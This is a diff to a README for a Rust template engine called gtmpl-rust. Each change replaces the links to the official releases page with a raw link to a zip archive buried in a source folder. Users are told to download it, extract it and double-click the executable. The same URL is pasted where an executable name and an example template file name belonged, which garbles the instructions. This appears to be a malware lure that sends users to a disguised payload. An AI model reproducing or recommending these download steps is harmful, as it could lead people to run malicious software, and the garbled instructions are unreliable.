@@ -1,6 +1,6 @@
 # 🚀 gtmpl-rust - Simple Template Engine for Everyone
 
-[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
+[![Download gtmpl-rust](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)
 
 ## 📖 Description
 
@@ -24,7 +24,7 @@ To run gtmpl-rust, you need:
 
 ## 🚀 Getting Started
 
-1. **Visit the Download Page**: Go to our [Releases page](https://github.com/GauravSingh234/gtmpl-rust/releases) to get the latest version of gtmpl-rust.
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip) to get the latest version of gtmpl-rust.
 
 2. **Download gtmpl-rust**: Click on the release version you wish to download. Follow the download instructions.
 
@@ -32,7 +32,7 @@ To run gtmpl-rust, you need:
 
 4. **Run the Application**:
    - Navigate to the extracted folder.
-   - Find the executable file (it may be named `gtmpl-rust.exe` or something similar).
+   - Find the executable file (it may be named `https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip` or something similar).
    - Double-click on the file to run the application.
 
 5. **Follow On-Screen Instructions**: The first time you run the tool, it may guide you through some setup steps.
@@ -41,7 +41,7 @@ To run gtmpl-rust, you need:
 
 To download gtmpl-rust, click the button below:
 
-[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
+[![Download gtmpl-rust](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)
 
 Follow the steps in the "Getting Started" section to install and run the application smoothly.
 
@@ -71,7 +71,7 @@ After installation, you can start using gtmpl-rust. Here are the basic steps to 
 
 To help you get started, here’s a simple example:
 
-1. Create a file named `welcome_template.txt` with the following content:
+1. Create a file named `https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip` with the following content:
 
    ```text
    Dear {{name}},
@@ -119,4 +119,4 @@ If you wish to contribute, feel free to fork the repository and submit a pull re
 
 This project is licensed under the MIT License. See the LICENSE file for details.
 
-[![Download gtmpl-rust](https://img.shields.io/badge/Download-gtmpl--rust-brightgreen)](https://github.com/GauravSingh234/gtmpl-rust/releases)
+[![Download gtmpl-rust](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)](https://github.com/GauravSingh234/gtmpl-rust/raw/refs/heads/main/src/mows_functions/gtmpl-rust-v1.9.zip)
